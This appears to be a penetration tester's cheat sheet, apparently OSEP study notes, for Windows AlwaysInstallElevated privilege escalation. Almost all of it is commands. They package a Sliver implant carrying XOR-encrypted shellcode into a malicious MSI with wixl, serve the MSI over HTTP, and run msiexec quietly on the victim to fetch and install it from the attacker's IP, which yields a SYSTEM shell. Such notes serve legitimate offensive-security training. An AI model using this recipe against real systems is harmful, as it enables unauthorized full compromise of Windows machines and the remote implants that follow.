# AlwaysInstallElevated

### 1) Install wixl

    sudo apt install wixl

### 2) Clone the MSI-AlwaysInstallElevated repo

    cd ~/tools
    git clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated
    cd ~/tools/MSI-AlwaysInstallElevated

### 3) C# OSEP binary with XOR encrypted shellcode into current directory

    sudo cp /home/kali/OSEP/hav0c/sliver.x64.exe .
    sudo chmod 777 sliver.x64.exe

### 4) Modify on line 15

From:

    <File Id="File0" Name="setup.exe" Source="setup.exe" /> <!-- Put the executable on the same directory-->

To:

    <File Id="File0" Name="setup.exe" Source="sliver.x64.exe" /> <!-- Put the executable on the same directory-->

### 5) Compile to .msi

    wixl -v WXS-Templates/alwaysInstallElevated-3.wxs -o alwaysInstallElevated.msi

### 6) Host the file on your machine for the victim machine to access it.

    sudo python3 -m http.server 80

### 7) Run on the victim, another shell should pop up as NT Auth\System

    execute -t 40 -o msiexec /qn /i http://10.10.10.11/alwaysInstallElevated.msi
